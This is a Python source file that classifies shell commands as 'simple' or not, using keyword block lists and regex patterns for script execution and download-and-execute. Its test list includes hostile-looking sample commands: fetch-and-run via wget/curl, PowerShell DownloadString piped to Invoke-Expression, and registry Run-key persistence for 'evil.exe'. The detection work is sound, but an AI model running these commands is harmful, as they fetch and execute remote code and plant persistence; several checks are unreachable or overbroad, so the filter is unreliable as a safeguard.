import re

def is_simple_command(command, considerRedir:bool):
    """
    Checks if a given command string is a simple command based on the defined criteria.

    Definition of a Simple Command:
    A simple command, as defined for this project, is a script or command that:
    1. Executes only one primary action.
    2. Does not contain or execute nested commands.
    3. Is not a command whose primary purpose is to execute another command or script.
    4. Does not involve sequences of commands (e.g., using separators like ';', '&&', '||').
    5. Does not involve piping the output to another command.
    6. Does not involve redirection of input or output (as this implies a secondary action).
    7. Is not explicitly listed or identified by patterns as a command known for executing other scripts or complex actions (e.g., 'forfiles', 'fork', 'IEX', package managers, etc.).

    Detailed Explanation of the Script's Logic:
    The script analyzes each command string in the input array to determine if it adheres to the definition of a simple command. Here's a breakdown of the checks performed:

    1. Explicitly Defined Non-Simple Keywords:
       - The script maintains a list of `non_simple_keywords` that include commands explicitly mentioned as non-simple in the definition (like 'forfiles', 'fork', 'iex') and other commands commonly used for executing scripts or complex tasks across different operating systems (Bash, SH, Python, PowerShell, Windows CMD).
       - If any of these keywords are found (case-insensitively) within the command string, the command is immediately classified as NOT simple.

    2. Special Handling for Specific Keywords:
       - 'exec': This keyword in Python can be used for various purposes. The script checks if it's specifically used to open and read a file, which suggests script execution.
       - 'start': In Windows CMD, 'start' can launch new processes, including scripts. The script uses a regular expression to differentiate between a simple application start and more complex uses that might involve script execution.
       - 'cmd': The 'cmd' command in Windows is the command interpreter itself. If it's used with arguments like '/w' or other switches indicating further command execution, it's considered NOT simple.
       - 'reg': The 'reg' command in Windows is used to modify the registry. Actions like 'add', 'import', 'load', 'restore', 'set', or 'delete' are considered NOT simple as they can be used to set up indirect script execution.
       - 'set-itemproperty': In PowerShell, this cmdlet can modify registry values. If it targets 'HKLM:' or 'HKCU:', it's considered NOT simple.
       - 'new-object': In PowerShell, this cmdlet creates objects. If it creates specific COM objects known for scripting (like 'WScript.Shell'), it's considered NOT simple.
       - Package Managers ('apt-get', 'yum', 'dnf', 'pacman'): If these commands are used with actions like 'install', 'update', 'upgrade', 'remove', or 'purge', they are considered NOT simple as they involve installing software which might include scripts.
       - Archive Manipulation ('tar', 'gzip', 'gunzip', 'unzip'): If these commands are used to extract or decompress archives, they are considered NOT simple as they might be extracting executable scripts.
       - 'chmod', 'chown': Changing file permissions or ownership on Linux can be a precursor to script execution, so their presence with arguments makes the command NOT simple.
       - 'wget', 'curl': These are used for downloading files, which could be scripts, so their presence contributes to the command being potentially non-simple, especially when followed by execution patterns.

    3. Direct Script Execution Patterns:
       - The script uses regular expressions to detect patterns that indicate direct execution of script files. This includes checking if the command starts with `./` (Linux/macOS), `.\\` (Windows PowerShell/CMD), UNC paths (`\\\\`), or absolute Windows paths (`C:\\`), followed by a filename with common script extensions ('.sh', '.bash', '.py', '.pl', '.rb', '.js', '.ps1', '.cmd', '.bat', '.vbs', '.wsf').

    4. PowerShell Specific Execution:
       - It checks for the explicit use of 'powershell' or 'pwsh' followed by arguments like '-Command', '-c', '-File', or '-f', which are used to execute PowerShell commands or scripts.
       - It also looks for patterns where content is downloaded using `(New-Object Net.WebClient).DownloadString` or similar methods and then executed using `Invoke-Expression` (or its alias `iex`).

    5. CMD `for /f` Execution:
       - Regular expressions are used to identify the pattern of using the 'for /f' command in Windows CMD to read and execute commands from a file (using 'type').

    6. Linux Specific Download and Execute Patterns:
       - The script looks for common Linux patterns where 'wget' or 'curl' are used to download files, followed by commands to change their execution permissions ('chmod +x') and then execute them, often using `&&`.
       - It also checks for piping the output of 'wget' or 'curl' directly to an interpreter like 'sh', 'bash', 'python', or 'perl'.

    7. Command Separators:
       - The script checks for the presence of command separators like ';', '&', '&&', or '||'. These indicate that multiple commands are being executed in sequence, which violates the "only one action" and "not commands in sequence" criteria.

    8. Piping:
       - The presence of the pipe symbol '|' is checked. Piping sends the output of one command to another, indicating multiple actions.

    9. Redirection:
       - The script uses a regular expression to look for redirection symbols like '<', '>', '>>', or '<<'. Redirection implies an action of reading from or writing to a file, which is considered an additional action beyond the primary command.

    10. Control Flow Keywords:
        - The script checks if the command starts with control flow keywords like 'if', 'else', 'elif', 'for', 'while', 'foreach', 'function', 'case', or 'esac'. These keywords typically introduce blocks of code or conditional execution, indicating more than a single simple action or the presence of nested commands.

    11. Parentheses and Curly Braces:
        - The script checks for the presence of parentheses '(' and ')' or curly braces '{' and '}'. These can indicate command grouping, subshells, or code blocks, suggesting complexity beyond a simple command.

    12. Shebang:
        - If the command starts with '#!', it's typically a script being executed with a specific interpreter, thus not a simple command in this definition.

    If a command string passes all these checks without triggering any of the non-simple conditions, the function returns `True`, classifying it as a simple command. Otherwise, it returns `False`.
    """

    command_lower = command.lower()
    command_strip = command.strip()

    # Check for explicitly defined non-simple commands (including the previous list)
    non_simple_keywords = ["forfiles", "fork", "iex"]

    # Add more keywords for executing files/scripts from Bash, SH, Python, and PowerShell
    execution_keywords = [
        "sh", "bash", "source", "env", "python", "python3", "py",
        "execfile",  # Python 2 (less common now)
        "runpy.run_path",  # Python module
        "powershell", "pwsh", "invoke-expression", "start-process", "register-scheduledjob",
        "call", "start", "wscript", "cscript", "mshta", "cmd",
        "invoke-command", "start-job", "import-module"
    ]
    non_simple_keywords.extend(execution_keywords)

    # Add keywords related to potential malicious indirect execution (Windows)
    malicious_keywords_win = [
        "schtasks", "wmic", "reg", "set-itemproperty", "new-scheduledtaskaction",
        "register-wmievent", "new-object", # Often used for COM object creation
        "rundll32" # Can be used to execute code in DLLs
    ]
    non_simple_keywords.extend(malicious_keywords_win)

    # Add keywords specific to Linux for script execution or potential malicious activity
    malicious_keywords_linux = [
        #"apt-get", "yum", "dnf", "pacman", # Package managers that can install scripts/executables
        #"tar", "gzip", "gunzip", "unzip", # Archive manipulation that might extract scripts
        "ssh", "scp", "rsync", # Remote execution/file transfer
        "nohup", "screen", "tmux", "at", "cron", # Backgrounding and scheduling
        #"kill", "pkill", "killall", # Process termination (could be part of a script)
        #"chmod", "chown", # Permission/ownership changes (making scripts executable)
        #"wget", "curl" # Downloading files (could be scripts)
    ]
    non_simple_keywords.extend(malicious_keywords_linux)

    for keyword in non_simple_keywords:
        if keyword in command_lower:
            # Special case for "exec" as it can be used in different contexts
            if keyword == "exec":
                # Consider "exec" as non-simple if followed by something that looks like file operation
                if re.search(r"exec\s*\(?\s*open\s*\(", command_lower):
                    return False
                # Otherwise, it might be a built-in command with a single action in some contexts
                continue # Allow further checks
            # Special case for "start" - be more specific to avoid false positives like "start menu"
            elif keyword == "start":
                if not re.match(r"^start\s+(?:\"[^\"]*\"|\S+)\s*(?:\/b)?\s*(?:\/w)?\s*(?:\/d\s+\"[^\"]*\")?\s*(?:\/low|\/normal|\/high|\/realtime|\/abovenormal|\/belownormal)?\s*(?:\/affinity\s+[0-9a-f]+)?\s*(?:\/node\s+<n>)?\s*(?:\/?)$", command_lower):
                    return False # If it doesn't look like a simple start of an application
                continue
            elif keyword == "cmd":
                # Consider cmd as non-simple if it has arguments indicating further command execution
                if re.search(r"cmd\s+/\w\s+", command_lower):
                    return False
                continue
            elif keyword == "reg":
                # Consider reg as non-simple if it's adding or modifying values
                if re.search(r"reg\s+(add|import|load|restore|set|delete)\s+", command_lower):
                    return False
                continue
            elif keyword == "set-itemproperty":
                # Consider Set-ItemProperty as non-simple if it targets specific registry locations
                if re.search(r"set-itemproperty\s+-\s*path\s+(hklm:|hkcu:)", command_lower):
                    return False
                continue
            elif keyword == "new-object":
                # Consider New-Object as non-simple if it creates certain COM objects known for scripting
                com_objects = ["scripting.filesystemobject", "wscript.shell", "msxml2.xmlhttp", "microsoft.xmlhttp"]
                for com_object in com_objects:
                    if re.search(r"new-object\s+-comobject\s+[\"']?" + re.escape(com_object) + "[\"']?", command_lower):
                        return False
                continue
            elif keyword in ["apt-get", "yum", "dnf", "pacman"]:
                # Package managers installing something is likely not a single simple action
                if re.search(r"(install|update|upgrade|remove|purge)", command_lower):
                    return False
                continue
            elif keyword in ["tar", "gzip", "gunzip", "unzip"]:
                # Archive operations that extract are likely not simple
                if re.search(r"(x|extract|d|decompress)", command_lower):
                    return False
                continue
            elif keyword in ["chmod", "chown"]:
                # Changing permissions or ownership can be a precursor to script execution
                if re.search(r"\s+\S+\s+", command): # Basic check for arguments
                    return False
                continue
            elif keyword in ["wget", "curl"]:
                # Downloading files followed by execution is common
                continue # Let the download and execute pattern catch this

            return False

    # Check for direct script execution patterns (e.g., ./script.sh, .\\script.ps1)
    script_extensions = r"(sh|bash|py|pl|rb|js|ps1|cmd|bat|vbs|wsf)"
    if re.match(r"^\.\/.*?\." + script_extensions + r"$", command_strip):
        return False
    if re.match(r"^\\{2}.*?\." + script_extensions + r"$", command_strip): # UNC path
        return False
    if re.match(r"^[a-zA-Z]:\\.*?\." + script_extensions + r"$", command_strip): # Windows absolute path
        return False
    if re.match(r"^\.\\[^\\]+\." + script_extensions + r"$", command_strip): # Relative path in PowerShell/CMD
        return False
    if command_strip.startswith(". ") and len(command_strip.split()) > 1: # source command alternative
        return False

    # Check for explicit PowerShell execution with -Command, -File, or potentially downloading and executing
    if re.search(r"^(powershell|pwsh)\s+.*?\-(command|c|file|f)\s+", command_lower):
        return False
    if re.search(r"\.(downloadstring|downloadfile)\s*\(.+?\)\s*\|\s*invoke-expression", command_lower):
        return False
    if re.search(r"new-object\s+net\.webclient.*?\.downloadstring\(.+?\)\s*\|\s*iex", command_lower):
        return False

    # Check for using 'for /f' to execute commands from a file (Windows CMD)
    if re.match(r"^for\s+\/f.*?\sin\s+\('type\s+[^']+'\)\s+do\s+%", command_lower):
        return False
    if re.match(r"^for\s+\/f.*?\sin\s+\(`type\s+[^`]+`\)\s+do\s+%", command_lower):
        return False

    # Check for Linux specific download and execute patterns
    if re.search(r"(wget|curl)\s+.*?&&\s*(chmod\s+\+x\s+\S+)\s*&&", command_lower):
        return False
    if re.search(r"(wget|curl)\s+-o\s+\S+\s+.*?&&\s*(chmod\s+\+x\s+\S+)\s*&&", command_lower):
        return False
    if re.search(r"(wget|curl)\s+.*?\|\s*(sh|bash|python|perl)\s*-", command_lower):
        return False
    if re.search(r"(wget|curl)\s+-o\s+\S+\s+.*?\|\s*(sh|bash|python|perl)\s*-", command_lower):
        return False

    # Check for command separators indicating multiple commands in sequence
    separators = [";", "&", "&&", "||"]
    for separator in separators:
        if separator in command:
            return False

    # Check for piping, indicating a sequence of commands
    if "|" in command:
        return False

    # Check for redirection, implying more than one action (read/write)
    if re.search(r'[<>]', command) and considerRedir:
        return False

    # Check for control flow keywords that might indicate nested or multiple commands
    control_flow_keywords = ["if", "else", "elif", "for", "while", "foreach", "function", "case", "esac"] # Added case/esac for bash
    first_word = command_strip.split()[0].lower() if command_strip else ""
    if first_word in control_flow_keywords:
        return False

    # Check for parentheses or curly braces that might indicate command grouping or subshells "(" in command or ")" in command or 
    if "{" in command or "}" in command:
        return False

    # Check for shebang at the beginning of the script (usually indicates script execution)
    if command_strip.startswith("#!"):
        return False

    # If none of the non-simple indicators are found, consider it simple
    return True

if __name__ == "__main__":
    commands = [
        "ls -l",
        "mkdir new_directory",
        "rm file.txt",
        "forfiles /p . /m *.txt /c \"cmd /c echo @file\"",
        "command1 | command2",
        "commandA ; commandB",
        "if [ condition ]; then echo 'yes'; fi",
        "IEX (Invoke-WebRequest -Uri 'http://example.com')",
        "echo 'hello' > output.txt",
        "cat < input.txt",
        "find . -name '*.py'",
        "my_script.sh",
        "./my_script.sh",
        "sh another_script.sh",
        "python my_script.py",
        "python3 my_script.py",
        "py my_script.py",
        "source setup.sh",
        ". config.sh",
        "env python script.py",
        "powershell -File my_script.ps1",
        "pwsh my_script.ps1",
        ".\\install.ps1",
        "& 'complex script.ps1'",
        "Invoke-Expression 'Get-Process | Stop-Process'",
        "Start-Process -FilePath 'notepad.exe'",
        "Register-ScheduledJob -Name 'Backup' -ScriptBlock { Backup-Data } -Trigger (New-ScheduledTaskTrigger -Daily -At 3am)",
        "fork my_process",
        "(cd another_dir && ls)",
        "{ echo 'block command'; }",
        "command1 && command2",
        "command1 || command2",
        "while true; do echo 'looping'; done",
        "execfile('old_script.py')",
        "runpy.run_path('module.py')",
        "#!/bin/bash echo 'hello from script'",
        "C:\\Scripts\\my_script.bat",
        "\\Server\\Share\\script.ps1",
        "call my_batch.bat",
        "start another_program.exe",
        "start \"\" /b hidden_script.bat",
        "wscript run_vbs.vbs",
        "cscript process_vbs.vbs",
        "mshta vbscript:ExecuteStatement(\"MsgBox('Hello')\")",
        "powershell -Command \"Get-Process\"",
        "cmd /c \"echo Hello from CMD\"",
        "invoke-command -ScriptBlock { Get-Service }",
        "invoke-command -FilePath 'remote_script.ps1' -ComputerName 'Server01'",
        "start-job -ScriptBlock { Get-EventLog -LogName System -Newest 10 }",
        "start-job -FilePath 'background_task.ps1'",
        "import-module ActiveDirectory",
        "Import-Module -Name WebAdministration",
        "start calc.exe", # Should be simple
        "start \"My App\" myapp.exe", # Should be simple
        "cmd /c echo Simple CMD command", # Should be simple
        "schtasks /create /tn MyTask /tr \"C:\\path\\to\\malicious.bat\" /sc DAILY /st 09:00",
        "wmic process call create 'powershell -Command \"Invoke-WebRequest -Uri http://malicious.com -OutFile C:\\temp\\bad.ps1; C:\\temp\\bad.ps1\"'",
        "for /f \"tokens=*\" %i in ('type commands.txt') do %i",
        "reg add HKCU\\Software\\MyKey /v RunOnce /d \"C:\\path\\to\\evil.exe\" /f",
        "set-itemproperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"EvilApp\" -Value \"C:\\path\\to\\evil.exe\"",
        "New-ScheduledTaskAction -Execute 'C:\\path\\to\\malicious.ps1'",
        "Register-WmiEvent -Query 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Name = \"notepad.exe\"' -Action { Start-Process calc.exe }",
        "(New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1') | Invoke-Expression",
        "new-object -ComObject WScript.Shell",
        "rundll32 susres.dll,DoSpecialLogin",
        "rundll32 user32.dll,OpenControlPanel", # Should be simple
        "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", # Should be simple
        "apt-get install some-package",
        "yum install another-package",
        "dnf install yet-another-package",
        "pacman -S a-package",
        "tar -xvf archive.tar.gz",
        "gzip -d compressed.gz",
        "unzip archive.zip",
        "ssh user@remotehost 'ls -l'",
        "scp localfile.txt user@remotehost:/home/user/",
        "rsync -avz localdir/ user@remotehost:/backup/",
        "nohup ./long_running_script.sh &",
        "screen -S my_session",
        "tmux new -s my_session",
        "kill -9 12345",
        "pkill -f process_name",
        "killall some_process",
        "chmod +x ./executable.sh",
        "chown user:group some_file.txt",
        "wget http://example.com/malicious.sh -O /tmp/malicious.sh",
        "curl -O http://example.com/malicious.sh",
        "wget http://example.com/evil.sh -O /tmp/evil.sh && chmod +x /tmp/evil.sh && /tmp/evil.sh",
        "curl http://example.com/script.py | python -",
        "at 12:00 /path/to/script.sh",
        "cron -e"
    ]

    simple_count = 0
    non_simple_count = 0

    print("Analyzing commands:")
    for command in commands:
        if is_simple_command(command, False):
            print(f"'{command}' is a simple command.")
            simple_count += 1
        else:
            print(f"'{command}' is NOT a simple command.")
            non_simple_count += 1

    print("\n--- Statistics ---")
    print(f"Total commands analyzed: {len(commands)}")
    print(f"Simple commands found: {simple_count}")
    print(f"Non-simple commands found: {non_simple_count}")